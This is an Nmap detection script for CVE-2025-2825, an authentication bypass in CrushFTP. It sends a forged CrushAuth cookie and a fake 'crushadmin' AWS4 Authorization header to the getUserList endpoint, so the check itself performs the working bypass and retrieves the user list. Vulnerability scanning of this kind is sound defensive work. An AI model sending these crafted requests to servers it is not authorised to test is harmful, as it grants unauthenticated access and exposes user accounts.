local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local nmap = require "nmap"

description = [[
  This script is intended to detect the authentication bypass vulnerability in CrushFTP v10.8.3 by sending crafted HTTP requests and analying the response to determine if the server can be accessed without valid credentials.
]]

author = "Mohamed Trigui"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

-- Run the script on the open HTTP ports
portrule = shortport.http

local function random_digits(length)
	local s = ""
	for i = 1, length do
		s = s .. tostring(math.random(0, 9))
	end
	return s
end

local function random_alphanum(length)
        local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        local s = ""
        for i = 1, length do
		local rand_index = math.random(1, #charset)
		s = s .. charset:sub(rand_index, rand_index)
  end
  return s
end

action = function(host, port)
   math.randomseed(os.time())

   -- 1.  Generating fake tokens
   local c2f = random_digits(4)
   local ts13 = random_digits(13)
   local rand = random_alphanum(28)
   
   -- Building the cookie value
   local crush_auth = ts13 .. "_" .. rand .. c2f
   local cookie = "CrushAuth=" .. crush_auth .. "; currentAuth=" .. c2f

   -- 2.  Building path
   local path = "/WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=" .. c2f
  
   local target = host.targetname or host.ip

   -- 3.  Craft the headers and cookies
   local headers = {
	   ["Authorization"] = "AWS4-HMAC-SHA256 Credential=crushadmin/",
	   ["Cookie"] = cookie,
	   ["X-Requested-With"] = "XMLHttpRequest",
	   ["Origin"] = "http://" .. target,
	   ["Referer"] = "http://" .. target .. "/WebInterface/login.html",
	   ["Accept-Encoding"] = "gzip"
   }

   local opts = { header = headers, ssl = false}

   -- 4.  Send 2 requests
   local response1 = http.get(host, port, path, {header=headers})
   local response2 = http.get(host, port, path, {header=headers})
   
   local vuln_found = false

   local check_response = function(response)
	   if response and response.status == 200 and response.body then
		   if response.body:find("<user_list_submitem>") then
			   return true
		   end
	   end
           return false
   end

   vuln_found = check_response(response1) or check_response(response2)
   if vuln_found then
	   return stdnse.format_output(true, "VULNERABLE: Authentication bypass (CVE-2025-2825) detected")
   else
	   return stdnse.format_output(false, "Not vulnerable or unable to verify vulnerability")
   end
end
   
